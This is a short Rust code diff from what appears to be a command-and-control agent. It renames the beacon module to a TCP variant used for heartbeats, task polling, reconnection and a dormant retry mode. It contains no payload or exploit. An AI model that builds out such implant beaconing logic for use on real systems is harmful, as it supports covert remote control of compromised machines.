@@ -4,7 +4,7 @@ use std::sync::Arc;
 
 use crate::post::commands::{AgentCommand, ResultQueue};
 use crate::utils::{logger, config::AppConfig};
-use crate::communication::beacon;
+use crate::communication::beacon_tcp;
 
 
 pub struct AgentState {
@@ -39,7 +39,7 @@ impl AgentState {
                 // Get results from queue
                 let results = result_queue.lock().await.take();
                 // Send heartbeat to C2 to requests tasks
-                match beacon::heartbeat(
+                match beacon_tcp::heartbeat(
                     &server_address,
                     agent_id,
                     &session_id,
@@ -75,7 +75,7 @@ impl AgentState {
             self.logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
             tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
     
-            let (new_agent_id, session_id) = beacon::reconnect(
+            let (new_agent_id, session_id) = beacon_tcp::reconnect(
                 &config.server_address, 
                 self.agent_id,
                 &self.session_id,
@@ -105,7 +105,7 @@ impl AgentState {
             self.logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
             tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
     
-            let (agent_id, session_id) = beacon::initial_beacon(
+            let (agent_id, session_id) = beacon_tcp::initial_beacon(
                 &config.server_address,
                 config.retries,
                 config.timeout_seconds,
